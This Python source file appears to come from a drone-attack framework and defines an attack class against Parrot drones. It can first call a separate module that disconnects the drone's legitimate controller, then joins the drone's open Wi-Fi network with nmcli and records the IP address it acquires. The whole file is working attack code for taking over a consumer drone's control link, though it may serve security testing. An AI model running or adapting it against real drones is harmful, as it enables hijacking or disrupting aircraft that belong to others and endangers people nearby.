from shared import Manufacturer, Model, AttackType, InterfaceMode, CommandExecutor
from modules.exploit.base_attack_script import BaseAttackScript, AttackResult, DroneTargetInfo
from modules.exploit.attack_factory import register_attack
from .disconnect_controller_device import DisconnectControllerDeviceParrot

@register_attack(
    manufacturer=Manufacturer.PARROT,
    models=[m.value for m in Model],
    attack_types=[AttackType.CONNECT_TO_WIFI],
)
class ConnectToDroneWifiAttackParrot(BaseAttackScript):
    """Optionally disconnect target first, then connect to open AP and update IP in target_info."""
    def __init__(self, target_info: DroneTargetInfo):
        super().__init__(target_info); self.exec = CommandExecutor()

    def attack(self) -> AttackResult:
        pre = self._ensure_interface_mode(InterfaceMode.MANAGED)
        if not pre.status: return pre
        if not self.target_info.ssid:
            return AttackResult(False, "", "", "SSID not provided in target_info.ssid")

        if self.target_info.data.get("disconnect_target_first", False):
            _ = DisconnectControllerDeviceParrot(self.target_info).attack()

        try:
            cmd = ["nmcli", "device", "wifi", "connect", self.target_info.ssid]
            res = self.exec.execute(cmd, timeout=25, sudo=self.target_info.use_sudo, exec_in_new_thread=False)
        except Exception as e:
            return AttackResult(False, "", str(e), "Failed to initiate Wiâ€‘Fi connection")

        try:
            ip = self._wifi.parse_ipv4_from_ip(self.target_info.interface)
        except Exception:
            ip = None

        if ip:
            self.target_info.ip_through_drone_ap = ip
            return AttackResult(True, ip, res.stderr, f"Connected to {self.target_info.ssid}; IP: {ip}")
        return AttackResult(False, res.stdout, res.stderr, "Connected but IP not acquired")
